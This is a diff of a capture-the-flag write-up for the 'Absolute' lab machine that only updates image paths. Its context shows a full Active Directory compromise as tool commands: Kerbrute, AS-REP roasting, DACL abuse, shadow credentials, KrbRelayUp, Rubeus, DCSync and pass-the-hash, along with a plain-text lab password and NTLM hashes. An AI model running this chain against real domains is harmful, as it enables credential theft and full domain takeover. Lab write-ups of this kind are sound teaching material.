@@ -86,11 +86,11 @@ Testing SMB and RPC for Null/Guest authentication both fail and LDAP doesn't all
 └─$ ldapsearch -x -H ldap://dc.absolute.htb -b "dc=ABSOLUTE,dc=HTB" -s base "(objectClass=user)"
 ```
 
-![](../assets/img/2026-05-15-Absolute/1.png)
+![](/assets/img/2026-05-15-Absolute/1.png)
 
 Checking out the landing page on port 80 shows the company's website with a slideshow displaying their work. There's not a whole lot on this page and the only link goes to a legitimate site hosting free templates. 
 
-![](../assets/img/2026-05-15-Absolute/2.png)
+![](/assets/img/2026-05-15-Absolute/2.png)
 
 ### Usernames via Image Metadata
 Because the text exclaims that the images are actually their work, I download them for closer inspection, hoping to at least find something interesting in the metadata. We can find the full URL for each image in the page's source code as well.
@@ -115,13 +115,13 @@ Using exiftool on each file prints a ton of data, however the only thing that st
 └─$ exiftool *.jpg | grep -i Author | awk '{print $3,$4}' > users.txt
 ```
 
-![](../assets/img/2026-05-15-Absolute/3.png)
+![](/assets/img/2026-05-15-Absolute/3.png)
 
 ```
 └─$ ./username-anarchy -i users.txt
 ```
 
-![](../assets/img/2026-05-15-Absolute/4.png)
+![](/assets/img/2026-05-15-Absolute/4.png)
 
 ## Exploitation
 
@@ -132,7 +132,7 @@ With a potential wordlist for domain users in hand, I'll use Kerbrute next to te
 └─$ ./kerbrute userenum --domain absolute.htb potentialUsernames.txt --dc dc.absolute.htb
 ```
 
-![](../assets/img/2026-05-15-Absolute/5.png)
+![](/assets/img/2026-05-15-Absolute/5.png)
 
 Looks like we need our username formats to be first initial + lastname. Now I'll use Impackets' [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) script to test if any of these accounts have Kerberos pre-authentication disabled and allow us to grab hashes.
 
@@ -142,7 +142,7 @@ In case you're unfamiliar with this technique, AS-REP Roasting is a credential a
 └─$ impacket-GetNPUsers -usersfile validUsers.txt -no-pass -dc-ip 10.129.232.60 absolute.htb/
 ```
 
-![](../assets/img/2026-05-15-Absolute/6.png)
+![](/assets/img/2026-05-15-Absolute/6.png)
 
 This results in just one **KRB5ASREP** hash for the _D.Klay_ user. Upon being sent over to Hashcat or JohnTheRipper, it cracks within a reasonable time and gives us valid domain credentials.
 
@@ -150,7 +150,7 @@ This results in just one **KRB5ASREP** hash for the _D.Klay_ user. Upon being se
 └─$ john hash --wordlist=/opt/seclists/rockyou.txt
 ```
 
-![](../assets/img/2026-05-15-Absolute/7.png)
+![](/assets/img/2026-05-15-Absolute/7.png)
 
 Attempting to use these over SMB procs an error saying that the user has an account restriction. This typically means that NTLM authentication has been disabled for the domain, which can be circumvented by swapping to Kerberos auth.
 
@@ -173,7 +173,7 @@ Retrying to enumerate SMB shares reveals one non-standard folder that we don't h
 └─$ nxc smb dc.absolute.htb -u 'd.klay' -p '[REDACTED]' -k --shares
 ```
 
-![](../assets/img/2026-05-15-Absolute/8.png)
+![](/assets/img/2026-05-15-Absolute/8.png)
 
 Now that we have creds, I brute-force RIDs to find discover more users on the domain which can assist us in later attacks. Once again we can extract the account names from the output with a few `awk` commands.
 
@@ -183,7 +183,7 @@ Now that we have creds, I brute-force RIDs to find discover more users on the do
 └─$ cat moreNames.txt | awk -F'\\' '{print $2}' | awk '{print $1}' > domainNames.txt
 ```
 
-![](../assets/img/2026-05-15-Absolute/9.png)
+![](/assets/img/2026-05-15-Absolute/9.png)
 
 After cleaning up the file and getting rid of the group names, we discover a few hidden entries for the SMB and Audit service accounts, as well as a WinRM user. I keep the ladder one in mind as we can infer that it has access to grab a shell over WinRM, therefore giving us a foothold on the machine.
 
@@ -194,7 +194,7 @@ Both Kerberoasting/AS-REP Roasting and spraying the previous password against al
 └─$ nxc ldap dc.absolute.htb -u 'd.klay' -p '[REDACTED]' -k --query "(samAccountName=svc_smb)" ""
 ```
 
-![](../assets/img/2026-05-15-Absolute/10.png)
+![](/assets/img/2026-05-15-Absolute/10.png)
 
 The only thing discovered was a string under the _svc_smb_ account's description which looks to be a password. Checking to see if it works over SMB succeeds and we find that we're now able to read the share
 
@@ -202,7 +202,7 @@ The only thing discovered was a string under the _svc_smb_ account's description
 └─$ nxc smb dc.absolute.htb -u 'svc_smb' -p '[REDACTED]' -k --shares
 ```
 
-![](../assets/img/2026-05-15-Absolute/11.png)
+![](/assets/img/2026-05-15-Absolute/11.png)
 
 ### Dynamic Binary Analysis
 We can use Impacket's [smbclient.py](https://github.com/fortra/impacket/blob/master/examples/smbclient.py) script to connect, seeing as we require Kerberos authentication.
@@ -211,7 +211,7 @@ We can use Impacket's [smbclient.py](https://github.com/fortra/impacket/blob/mas
 └─$ impacket-smbclient absolute.htb/'svc_smb':'[REDACTED]'@dc.absolute.htb -k -no-pass
 ```
 
-![](../assets/img/2026-05-15-Absolute/12.png)
+![](/assets/img/2026-05-15-Absolute/12.png)
 
 Inside, we find a test executable along with a compiler script for it. Looking at what it does shows that it uses MinGW to cross-compile a Nim executable from Linux to Windows.
 
@@ -224,7 +224,7 @@ nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1
 
 At this point, I swap over to my Windows VM in order to perform some dynamic binary analysis, specifically looking for any outbound requests. Spinning up Wireshark and executing the binary shows that the program attempt to make an LDAP bind to `absolute.htb` as the _M.Lovegod_ user and provides a password using simple authentication. 
 
-![](../assets/img/2026-05-15-Absolute/13.png)
+![](/assets/img/2026-05-15-Absolute/13.png)
 
 ## Initial Foothold
 
@@ -239,11 +239,11 @@ Confirming that these credentials work shows that we can't quite get a shell yet
 └─$ sudo bloodhound
 ```
 
-![](../assets/img/2026-05-15-Absolute/14.png)
+![](/assets/img/2026-05-15-Absolute/14.png)
 
 After letting those JSON files digest for a bit and checking which outbound object permissions our new user has, we find that _M.Lovegod_ owns the Network Audit group which has GenericWrite over the _winrm_user_ account.
 
-![](../assets/img/2026-05-15-Absolute/15.png)
+![](/assets/img/2026-05-15-Absolute/15.png)
 
 Because our current user has ownership of the Audit group, we can write malicious DACLs in order to grant ourselves FullControl over it and then add ourselves. Once we have obtained group membership, our new GenericWrite permissions will let take over the _winrm_user_ and give us shell access on the DC.
 
@@ -293,7 +293,7 @@ absolute\m.lovegod
 absolute\svc_audit
 ```
 
-![](../assets/img/2026-05-15-Absolute/16.png)
+![](/assets/img/2026-05-15-Absolute/16.png)
 
 ### Shadow Credentials
 Next, I want to take over the _winrm_user_ account by abusing our GenericWrite permissions. We have two main routes to go about here:
@@ -314,7 +314,7 @@ I'll go with the former, since cracking a hash isn't guaranteed and this way is 
 └─$ certipy-ad shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip 10.129.33.160 -target dc.absolute.htb -account winrm_user
 ```
 
-![](../assets/img/2026-05-15-Absolute/17.png)
+![](/assets/img/2026-05-15-Absolute/17.png)
 
 _Note: It seems that this box's old certificate is broken and results in an error saying that the KDC does not support PADATA. We can fix this by using the Administrator's hash to get an interactive shell and use the `gpupdate /force` command to fix this issue. In theory, we could also utilize a certificate created from a tool like [pywhisker](https://github.com/ShutdownRepo/pywhisker) in a Pass-The-Cert attack, however I want to keep with the spirit of how the challenge was meant to be solved. Skip to the end of this writeup in order to grab the login command for it :)_
 
@@ -326,7 +326,7 @@ Although it gives us the NTLM hash, we'll still have to use the .ccache file in
 └─$ evil-winrm -i dc.absolute.htb -r absolute.htb
 ```
 
-![](../assets/img/2026-05-15-Absolute/18.png)
+![](/assets/img/2026-05-15-Absolute/18.png)
 
 At this point, we can grab the user flag under their desktop folder and start looking at ways to escalate privileges to Administrator.
 
@@ -355,13 +355,13 @@ Let's start by executing a KrbRelay attack to grab that certificate. In order to
 
 The RunasCs tool supports the use of different level trusts upon execution which can be displayed with both the `-l` and `-h` flags in conjunction. As we are adding a ShadowCred here, I use level 9 that matches NewCredentials.
 
-![](../assets/img/2026-05-15-Absolute/19.png)
+![](/assets/img/2026-05-15-Absolute/19.png)
 
 ```
 PS> .\RunasCs.exe m.lovegod AbsoluteLDAP2022! -d absolute.htb -l 9 "C:\temp\KrbRelayUp.exe relay -m shadowcred -cls {752073A1-23F2-4396-85F0-8FDB879ED0ED}"
 ```
 
-![](../assets/img/2026-05-15-Absolute/20.png)
+![](/assets/img/2026-05-15-Absolute/20.png)
 
 Now we can grab the certificate portion (the massive Base64 blob) as well as the password and send it over to Rubeus in order to grab a high-privileged NTLM hash.
 
@@ -369,7 +369,7 @@ Now we can grab the certificate portion (the massive Base64 blob) as well as the
 PS> ./Rubeus.exe asktgt /user:DC$ /certificate:'[CERTIFICATE_BLOB]' /password:'[PASSWORD_STRING]' /getcredentials /show /nowrap
 ```
 
-![](../assets/img/2026-05-15-Absolute/21.png)
+![](/assets/img/2026-05-15-Absolute/21.png)
 
 From here, we can utilize this in a DCSync attack with a tool like Impacket's [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) script to gather all domain hashes.
 
@@ -377,7 +377,7 @@ From here, we can utilize this in a DCSync attack with a tool like Impacket's [s
 └─$ impacket-secretsdump absolute.htb/'DC$'@dc.absolute.htb -hashes ':A7864AB463177ACB9AEC553F18F42577'
 ```
 
-![](../assets/img/2026-05-15-Absolute/22.png)
+![](/assets/img/2026-05-15-Absolute/22.png)
 
 Finally, using the Administrator's NTLM in a Pass-The-Hash attack allows us to grab a shell with full domain privileges. Grabbing the root flag under their desktop folder will complete this challenge.
 
@@ -385,6 +385,6 @@ Finally, using the Administrator's NTLM in a Pass-The-Hash attack allows us to g
 └─$ evil-winrm -i dc.absolute.htb -u administrator -H '1f4a6093623653f6488d5aa24c75f2ea'
 ```
 
-![](../assets/img/2026-05-15-Absolute/23.png)
+![](/assets/img/2026-05-15-Absolute/23.png)
 
 That's all y'all, apart from the broken certificate that had me stuck for seemingly no reason, this box was truly amazing. It forced us to dig deep into how Kerberos authentication works and had some more realistic attack vectors to get a foothold instead of Guest auth being enabled like some others. I hope this was helpful to anyone following along or stuck and happy hacking!
